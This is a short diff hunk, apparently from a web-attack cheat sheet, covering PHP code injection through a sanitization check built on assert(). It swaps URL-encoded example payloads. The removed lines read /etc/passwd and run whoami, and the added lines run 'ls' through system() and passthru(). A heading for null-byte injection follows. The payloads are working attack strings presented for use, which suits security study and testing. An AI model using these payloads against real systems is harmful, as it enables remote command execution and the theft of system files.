@@ -60,8 +60,8 @@ If sanitization is done using assert function, injection arbitrary code could be
     assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
 ?>
 ```
-`http://server/site.php?file=%27%20and%20die(show_source(%27%2Fetc%2Fpasswd%27))%20or%20%27`  
-`http://server/site.php?file=%27%20and%20die(system(%22whoami%22))%20or%20%27`  
+`http://server/site.php?file=%27.system(%22ls%22).%27`  
+`http://server/site.php?file=%27.passthru%28%22ls%22%29.%27`
 
 ### Nullbyte injection 
 When '.php' is appended, it can be bypassed with nullbyte in php versions before 5.3.4, or if 'magic_quotes_gpc' is set to Off.  
